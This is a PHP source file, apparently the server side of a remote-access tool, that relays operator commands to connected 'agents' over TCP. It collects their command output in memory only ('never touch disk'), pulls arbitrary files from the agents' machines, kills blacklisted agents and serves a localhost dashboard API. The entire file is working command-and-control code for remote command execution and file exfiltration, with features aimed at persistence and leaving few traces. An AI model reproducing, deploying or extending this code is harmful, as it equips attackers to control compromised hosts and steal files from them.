<?php
/*
 * relay.php - TCP Relay + Internal HTTP API
 * Agents connect via TCP (port 7331)
 * Dashboard queries via HTTP (port 7332, localhost only)
 *
 * Results stay in memory — never touch disk
 *
 * MUST run with php-cli, NOT php-cgi:
 *   nohup php relay.php > /dev/null 2>&1 &
 */

/* Force unlimited execution */
set_time_limit(0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '256M');
ini_set('default_socket_timeout', -1);
error_reporting(0);
ignore_user_abort(true);

/* Verify we're running CLI */
if (php_sapi_name() !== 'cli') {
    die("! Must run with php-cli, not " . php_sapi_name() . "\n"
      . "  Use: php relay.php\n"
      . "  NOT: php-cgi relay.php\n");
}

$tcp_port  = $argv[1] ?? 7331;
$http_port = $argv[2] ?? 7332;
$agents_dir = __DIR__ . '/agents';
$blacklist_file = __DIR__ . '/blacklist.json';
$max_results = 50;
$keepalive_interval = 30;  // Ping agents every 30s to prevent NAT timeout

if (!file_exists($agents_dir)) mkdir($agents_dir, 0777, true);

/* In-memory result storage: agent_id => [results] */
$results = [];

/* Download tracking: dl_id => [agent_id, path, status, size, received, filename, tmpfile] */
$downloads = [];
$dl_dir = __DIR__ . '/downloads';
if (!file_exists($dl_dir)) mkdir($dl_dir, 0777, true);

/* TCP server for agents */
$tcp = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_set_option($tcp, SOL_SOCKET, SO_REUSEADDR, 1);
if (!socket_bind($tcp, '0.0.0.0', $tcp_port)) die("! tcp bind $tcp_port\n");
socket_listen($tcp, 20);
socket_set_nonblock($tcp);

/* HTTP server for dashboard (localhost only) */
$http = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
socket_set_option($http, SOL_SOCKET, SO_REUSEADDR, 1);
if (!socket_bind($http, '127.0.0.1', $http_port)) die("! http bind $http_port\n");
socket_listen($http, 10);
socket_set_nonblock($http);

echo "⚡ Relay: TCP=$tcp_port  HTTP=$http_port\n";

$clients = [];  // (int)sock => [sock, id, buf, ip]
$id_map  = [];  // agent_id => socket

/* Blacklist */
function load_blacklist() {
    global $blacklist_file;
    if (file_exists($blacklist_file))
        return json_decode(file_get_contents($blacklist_file), true) ?: [];
    return [];
}

function is_blacklisted($aid) {
    $bl = load_blacklist();
    return in_array($aid, $bl);
}

function sock_send($s, $d) {
    $j = json_encode($d, JSON_UNESCAPED_SLASHES) . "\n";
    @socket_write($s, $j, strlen($j));
}

function touch_agent($dir, $ip) {
    $cf = "$dir/config.json";
    $c = file_exists($cf) ? json_decode(file_get_contents($cf), true) : [];
    $c['last_seen'] = date('Y-m-d H:i:s');
    $c['ip'] = $ip;
    $c['transport'] = 'tcp';
    file_put_contents($cf, json_encode($c));
}

function drop_client($s) {
    global $clients, $id_map, $downloads;
    $k = (int)$s;
    if (isset($clients[$k])) {
        $aid = $clients[$k]['id'];
        /* Clean up if this was a download connection */
        if (!empty($clients[$k]['dl_conn'])) {
            $dl_id = $clients[$k]['dl_conn'];
            if (isset($downloads[$dl_id]) && $downloads[$dl_id]['status'] === 'downloading') {
                if (isset($downloads[$dl_id]['fh']) && $downloads[$dl_id]['fh']) {
                    fclose($downloads[$dl_id]['fh']);
                }
                $downloads[$dl_id]['status'] = 'error';
                $downloads[$dl_id]['error'] = 'download connection lost';
                echo "[DL] $dl_id aborted: connection lost\n";
            }
        }
        if ($aid && substr($aid, 0, 5) !== '__dl_' && isset($id_map[$aid])) {
            unset($id_map[$aid]);
            echo "[-] $aid\n";
        }
        unset($clients[$k]);
    }
    @socket_close($s);
}

/* Finalize download — decompress if needed */
function finalize_download($dl_id) {
    global $downloads;
    if (!isset($downloads[$dl_id])) return;
    $dl =& $downloads[$dl_id];

    if (!empty($dl['compressed'])) {
        $gz = $dl['tmpfile'] . '.gz';
        if (file_exists($gz)) {
            exec("gzip -d -f " . escapeshellarg($gz) . " 2>/dev/null");
            /* gzip -d removes .gz and produces the file without extension = tmpfile */
            if (!file_exists($dl['tmpfile']) && file_exists(str_replace('.gz', '', $gz))) {
                rename(str_replace('.gz', '', $gz), $dl['tmpfile']);
            }
        }
    }
    $dl['status'] = 'done';
    $dl['received'] = $dl['size']; /* Report original size to UI */
    @chmod($dl['tmpfile'], 0644);
    echo "[DL] $dl_id complete: " . number_format($dl['size']) . " bytes\n";
}

function handle_http($s) {
    global $results, $id_map, $clients, $downloads, $dl_dir;

    $raw = @socket_read($s, 8192);
    if (!$raw) { @socket_close($s); return; }

    preg_match('/^(GET|POST)\s+([^\s]+)/', strtok($raw, "\r\n"), $m);
    $path = $m[2] ?? '/';
    $query = [];
    $parts = parse_url($path);
    if (isset($parts['query'])) parse_str($parts['query'], $query);

    $action   = $query['action'] ?? '';
    $agent_id = $query['agent_id'] ?? '';
    $resp = [];

    switch ($action) {
        case 'get_results':
            $resp = $results[$agent_id] ?? [];
            break;

        case 'get_results_and_clear':
            $resp = $results[$agent_id] ?? [];
            $results[$agent_id] = [];
            break;

        case 'clear_results':
            $results[$agent_id] = [];
            $resp = ['success' => true];
            break;

        case 'online_agents':
            foreach ($id_map as $aid => $sock) {
                $ip = $clients[(int)$sock]['ip'] ?? '';
                $resp[] = ['id' => $aid, 'ip' => $ip];
            }
            break;

        case 'start_download':
            $filepath = $query['path'] ?? '';
            if (!$agent_id || !$filepath || !isset($id_map[$agent_id])) {
                $resp = ['error' => 'agent offline or bad params'];
                break;
            }
            $dl_id = substr(md5(uniqid(mt_rand(), true)), 0, 16);
            $tmpfile = "$dl_dir/$dl_id.tmp";
            $downloads[$dl_id] = [
                'agent_id' => $agent_id,
                'path'     => $filepath,
                'status'   => 'starting',
                'size'     => 0,
                'received' => 0,
                'filename' => basename($filepath),
                'tmpfile'  => $tmpfile,
                'started'  => time()
            ];
            // Tell agent to start sending file
            sock_send($id_map[$agent_id], [
                'action' => 'download',
                'dl_id'  => $dl_id,
                'path'   => $filepath
            ]);
            $resp = ['success' => true, 'dl_id' => $dl_id];
            echo "[DL] $dl_id start: $filepath from $agent_id\n";
            break;

        case 'download_status':
            $dl_id = $query['dl_id'] ?? '';
            if (isset($downloads[$dl_id])) {
                $dl = $downloads[$dl_id];
                $xfer_size = $dl['send_size'] ?? $dl['size'];
                $resp = [
                    'status'   => $dl['status'],
                    'size'     => $dl['size'],         /* original file size */
                    'received' => $dl['received'],     /* bytes received so far (may be compressed) */
                    'transfer_size' => $xfer_size,     /* actual bytes being sent */
                    'compressed' => $dl['compressed'] ?? 0,
                    'filename' => $dl['filename'],
                    'pct'      => $xfer_size > 0 ? round(($dl['received'] / $xfer_size) * 100, 1) : 0
                ];
                if ($dl['status'] === 'done') {
                    $resp['url'] = 'downloads/' . $dl_id . '.tmp';
                }
                if ($dl['status'] === 'error') {
                    $resp['error'] = $dl['error'] ?? 'unknown';
                }
            } else {
                $resp = ['error' => 'unknown dl_id'];
            }
            break;

        case 'download_cleanup':
            $dl_id = $query['dl_id'] ?? '';
            if (isset($downloads[$dl_id])) {
                if (isset($downloads[$dl_id]['fh']) && $downloads[$dl_id]['fh']) {
                    fclose($downloads[$dl_id]['fh']);
                }
                @unlink($downloads[$dl_id]['tmpfile']);
                unset($downloads[$dl_id]);
                $resp = ['success' => true];
            }
            break;

        case 'status':
            $resp = [
                'agents' => count($id_map),
                'buffered_results' => array_sum(array_map('count', $results)),
                'active_downloads' => count($downloads)
            ];
            break;

        default:
            $resp = ['error' => 'unknown action'];
    }

    $json = json_encode($resp);
    $out = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\n"
         . "Access-Control-Allow-Origin: *\r\nContent-Length: " . strlen($json)
         . "\r\nConnection: close\r\n\r\n" . $json;
    @socket_write($s, $out, strlen($out));
    @socket_close($s);
}

/* Main loop */
$last_cmd = 0;

$start_time = time();
$last_prune = time();

while (true) {
    /* Auto-recycle every 6 hours — systemd restarts, agents reconnect in 3s */
    if (time() - $start_time > 21600) {
        echo "[*] Recycling\n";
        exit(0);
    }

    /* Prune results for disconnected agents every 5 min */
    if (time() - $last_prune > 300) {
        foreach ($results as $aid => $r) {
            if (!isset($id_map[$aid])) unset($results[$aid]);
        }
        /* Clean stale downloads older than 1 hour */
        foreach ($downloads as $dlid => $dl) {
            if (time() - $dl['started'] > 3600) {
                if (isset($dl['fh']) && $dl['fh']) fclose($dl['fh']);
                @unlink($dl['tmpfile']);
                unset($downloads[$dlid]);
            }
        }
        $last_prune = time();
    }

    $read = [$tcp, $http];
    foreach ($clients as $c) $read[] = $c['sock'];
    $w = $e = null;
    $sel_timeout = count($downloads) > 0 ? 1000 : 50000; /* 1ms during downloads, 50ms idle */
    @socket_select($read, $w, $e, 0, $sel_timeout);

    /* New agent TCP connections */
    if (in_array($tcp, $read)) {
        $n = @socket_accept($tcp);
        if ($n) {
            socket_set_nonblock($n);
            socket_getpeername($n, $ip);
            /* Large receive buffer for file downloads */
            @socket_set_option($n, SOL_SOCKET, SO_RCVBUF, 1048576);
            /* Enable TCP keepalive to prevent NAT/firewall drops */
            socket_set_option($n, SOL_SOCKET, SO_KEEPALIVE, 1);
            /* Linux-specific: probe after 30s idle, every 10s, 3 failures = dead */
            @socket_set_option($n, SOL_TCP, 4, 30);   // TCP_KEEPIDLE
            @socket_set_option($n, SOL_TCP, 5, 10);   // TCP_KEEPINTVL
            @socket_set_option($n, SOL_TCP, 6, 3);    // TCP_KEEPCNT
            $clients[(int)$n] = ['sock'=>$n, 'id'=>null, 'buf'=>'', 'ip'=>$ip, 'last_ping'=>time()];
        }
    }

    /* HTTP requests from dashboard */
    if (in_array($http, $read)) {
        $n = @socket_accept($http);
        if ($n) handle_http($n);
    }

    /* Read from agents */
    foreach ($clients as $k => &$cl) {
        if (!in_array($cl['sock'], $read)) continue;

        $data = @socket_read($cl['sock'], 262144);
        if ($data === false || $data === '') { drop_client($cl['sock']); continue; }

        $cl['buf'] .= $data;

        /* Download connection: dedicated tight loop — drain all available data */
        if (!empty($cl['dl_conn'])) {
            $dl_id = $cl['dl_conn'];
            if (!isset($downloads[$dl_id])) {
                @socket_close($cl['sock']);
                unset($clients[$k]);
                continue;
            }
            $dl =& $downloads[$dl_id];

            /* Write initial buffer data */
            if (strlen($cl['buf']) > 0 && $cl['dl_remain'] > 0 && isset($dl['fh']) && $dl['fh']) {
                $bytes = min(strlen($cl['buf']), $cl['dl_remain']);
                fwrite($dl['fh'], $cl['buf'], $bytes);
                $dl['received'] += $bytes;
                $cl['dl_remain'] -= $bytes;
                $cl['buf'] = '';
            }

            /* Tight drain loop — keep reading until socket would block.
               This is the key: we pull ALL buffered TCP data per select cycle
               instead of waiting 1ms between each 262KB read. */
            while ($cl['dl_remain'] > 0) {
                $chunk = @socket_read($cl['sock'], 524288);
                if ($chunk === false || $chunk === '') break; /* would block or error */
                $clen = strlen($chunk);
                $bytes = min($clen, $cl['dl_remain']);
                fwrite($dl['fh'], $chunk, $bytes);
                $dl['received'] += $bytes;
                $cl['dl_remain'] -= $bytes;
            }

            if ($cl['dl_remain'] <= 0) {
                if (isset($dl['fh']) && $dl['fh']) { fclose($dl['fh']); unset($dl['fh']); }
                finalize_download($dl_id);
                @socket_close($cl['sock']);
                unset($clients[$k]);
            }
            continue;
        }

        /* Detect new download connection: starts with "DL:" */
        if ($cl['id'] === null && strpos($cl['buf'], "\n") !== false && substr($cl['buf'], 0, 3) === 'DL:') {
            $hdr_end = strpos($cl['buf'], "\n");
            $header = substr($cl['buf'], 0, $hdr_end);
            $cl['buf'] = substr($cl['buf'], $hdr_end + 1);
            $parts = explode(':', $header);
            /* DL:<dl_id>:<original_size>:<send_size>:<compressed> */
            if (count($parts) >= 5) {
                $dl_id = $parts[1];
                $orig_size = (int)$parts[2];
                $send_size = (int)$parts[3];
                $compressed = (int)$parts[4];
                if (isset($downloads[$dl_id])) {
                    $cl['dl_conn'] = $dl_id;
                    $cl['dl_remain'] = $send_size;
                    $cl['id'] = '__dl__' . $dl_id;
                    @socket_set_option($cl['sock'], SOL_SOCKET, SO_RCVBUF, 2097152);
                    $dl =& $downloads[$dl_id];
                    $dl['size'] = $orig_size;
                    $dl['compressed'] = $compressed;
                    $dl['status'] = 'downloading';
                    $write_path = $compressed ? $dl['tmpfile'] . '.gz' : $dl['tmpfile'];
                    $dl['write_path'] = $write_path;
                    if (!isset($dl['fh'])) $dl['fh'] = fopen($write_path, 'wb');
                    $ratio = ($compressed && $send_size < $orig_size)
                        ? round((1 - $send_size/$orig_size) * 100) . '% saved'
                        : 'raw';
                    echo "[DL] $dl_id: " . number_format($orig_size) . " bytes ($ratio), sending " . number_format($send_size) . "\n";
                    if (strlen($cl['buf']) > 0) {
                        $bytes = min(strlen($cl['buf']), $cl['dl_remain']);
                        if ($dl['fh']) {
                            fwrite($dl['fh'], $cl['buf'], $bytes);
                            $dl['received'] += $bytes;
                            $cl['dl_remain'] -= $bytes;
                            $cl['buf'] = '';
                        }
                        if ($cl['dl_remain'] <= 0) {
                            if ($dl['fh']) { fclose($dl['fh']); unset($dl['fh']); }
                            finalize_download($dl_id);
                            @socket_close($cl['sock']);
                            unset($clients[$k]);
                        }
                    }
                    continue;
                }
            }
            @socket_close($cl['sock']);
            unset($clients[$k]);
            continue;
        }

        while (($pos = strpos($cl['buf'], "\n")) !== false) {
            $line = substr($cl['buf'], 0, $pos);
            $cl['buf'] = substr($cl['buf'], $pos + 1);
            $msg = json_decode($line, true);
            if (!$msg) continue;

            switch ($msg['action'] ?? '') {
                case 'auth':
                    $aid = $msg['agent_id'] ?? '';
                    if (!$aid) break;

                    /* Blacklisted — send kill and drop */
                    if (is_blacklisted($aid)) {
                        sock_send($cl['sock'], ['status'=>'kill']);
                        echo "[!] KILLED blacklisted $aid ({$cl['ip']})\n";
                        drop_client($cl['sock']);
                        break;
                    }

                    if (isset($id_map[$aid])) drop_client($id_map[$aid]);
                    $cl['id'] = $aid;
                    $id_map[$aid] = $cl['sock'];
                    $dir = "$agents_dir/$aid";
                    if (!file_exists($dir)) mkdir($dir, 0777, true);
                    touch_agent($dir, $cl['ip']);
                    if (!isset($results[$aid])) $results[$aid] = [];
                    sock_send($cl['sock'], ['status'=>'ok']);
                    echo "[+] $aid ({$cl['ip']})\n";
                    break;

                case 'result':
                    $aid = $cl['id'];
                    if (!$aid) break;
                    if (!isset($results[$aid])) $results[$aid] = [];
                    $results[$aid][] = [
                        'command'   => $msg['command'] ?? '',
                        'output'    => $msg['output'] ?? '',
                        'exit_code' => $msg['exit_code'] ?? 0,
                        'timestamp' => date('Y-m-d H:i:s')
                    ];
                    global $max_results;
                    if (count($results[$aid]) > $max_results)
                        $results[$aid] = array_slice($results[$aid], -$max_results);
                    touch_agent("$agents_dir/$aid", $cl['ip']);
                    break;

                case 'ping':
                    sock_send($cl['sock'], ['status'=>'pong']);
                    if ($cl['id']) touch_agent("$agents_dir/{$cl['id']}", $cl['ip']);
                    break;

                case 'file_error':
                    $dl_id = $msg['dl_id'] ?? '';
                    if (isset($downloads[$dl_id])) {
                        $downloads[$dl_id]['status'] = 'error';
                        $downloads[$dl_id]['error'] = $msg['error'] ?? 'unknown';
                        echo "[DL] {$dl_id} error: {$msg['error']}\n";
                    }
                    break;
            }
        }
    }
    unset($cl);

    /* Push pending commands + keepalive */
    $now = microtime(true);
    if ($now - $last_cmd >= 0.1) {
        $last_cmd = $now;
        $now_ts = time();

        foreach ($id_map as $aid => $sock) {
            /* Push commands */
            $f = "$agents_dir/$aid/command.txt";
            if (file_exists($f)) {
                $cmd = file_get_contents($f);
                @unlink($f);
                if ($cmd !== false && $cmd !== '')
                    sock_send($sock, ['action'=>'command', 'command'=>trim($cmd)]);
                /* Reset keepalive timer on activity */
                if (isset($clients[(int)$sock]))
                    $clients[(int)$sock]['last_ping'] = $now_ts;
            }

            /* Keepalive: ping idle agents to prevent NAT/firewall drops
               Skip download sockets — they don't speak JSON */
            $has_download = !empty($clients[(int)$sock]['dl_conn']);
            $k = (int)$sock;
            if (!$has_download && isset($clients[$k]) && ($now_ts - $clients[$k]['last_ping']) >= $keepalive_interval) {
                $ping = json_encode(['action'=>'ping']) . "\n";
                $sent = @socket_write($sock, $ping, strlen($ping));
                if ($sent === false) {
                    /* Dead connection */
                    drop_client($sock);
                } else {
                    $clients[$k]['last_ping'] = $now_ts;
                }
            }
        }
    }
}